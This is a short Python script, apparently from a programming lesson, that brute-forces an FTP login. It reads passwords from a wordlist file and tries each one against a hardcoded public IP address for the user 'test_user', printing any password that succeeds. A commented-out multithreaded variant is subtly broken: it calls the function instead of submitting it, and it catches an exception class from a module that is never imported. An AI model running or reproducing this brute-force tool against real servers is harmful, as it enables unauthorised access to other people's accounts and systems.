from ftplib import FTP, all_errors
import os
import concurrent.futures

# https://www.thepythoncode.com/article/brute-force-attack-ftp-servers-using-ftplib-in-python

def try_ftp(psw: str):
    host = "45.143.93.4"
    user = "test_user"
    try:
        with FTP(host=host, user=user, passwd=psw) as ftp:
            return f"psw= {psw}"
    except all_errors as e:
        return e


os.chdir('./Lesson10')
with open('psw.txt') as file:
    pswds = file.readlines()

# 450-500
for p in pswds[501:]:
    print(try_ftp(p.strip()))

# with concurrent.futures.ThreadPoolExecutor() as executor:
#     futures = []
#     for p in pswds[450:455]:
#         futures.append(executor.submit(try_ftp(p.strip())))
#     for future in concurrent.futures.as_completed(futures):
#         try:
#             print(future.result())
#         except ftplib.Error as e:
#             print(e)
